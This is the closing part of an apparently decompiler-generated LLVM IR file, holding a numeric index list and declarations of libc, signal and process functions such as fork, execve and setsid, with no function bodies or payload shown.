611, 98, 99, 100, 101, 517, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 18, 532, 533, 518, 519, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 19, 124, 125, 126, 127, 128, 129, 130, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 31, 545, 546, 547, 548, 549, 20, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 608, 609, 131, 132, 133, 448, 449, 450, 451, 452, 453, 21, 454, 455, 456, 476, 477, 478, 479, 480, 624, 625, 626, 627, 628, 629, 630, 634, 635, 474, 475, 227, 228, 467, 468, 229, 230, 231, 232, 233, 234, 235, 236, 401, 402, 403, 404, 405, 406, 407, 408, 390, 393, 394, 395, 396, 397, 391, 392, 134, 135, 136, 137, 409, 410, 411, 412, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 273, 274, 22, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 23, 288, 289, 290, 291, 292, 71, 72, 73, 74, 268, 270, 269, 271, 272, 593, 24, 594, 595, 596, 597, 32, 25, 29, 598, 636, 637, 638, 639, 640, 414, 415, 416, 417, 418, 419, 26, 420, 27, 421, 422, 423, 424, 425, 426, 427, 293, 294, 295, 296, 297, 298, 370, 371, 372, 373, 374, 573, 574, 306, 307, 606, 607, 138, 139, 481, 482, 491, 492, 140, 141, 142, 496, 497, 612, 613, 564, 565, 566, 631, 632, 633, 498, 499, 567, 568, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 469, 470, 500, 501, 502, 503, 504, 153, 154, 155, 604, 605, 615, 616, 617, 156, 157, 158, 159, 160, 161, 162, 163, 166, 167, 168, 169, 170, 171, 172, 185, 186, 187, 188, 191, 192, 193, 194, 195, 196, 299, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 308, 309, 310, 311, 457, 458, 464, 465, 466, 471, 472, 473, 483, 484, 485, 486, 487, 488, 489, 490, 560, 561, 562, 563 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
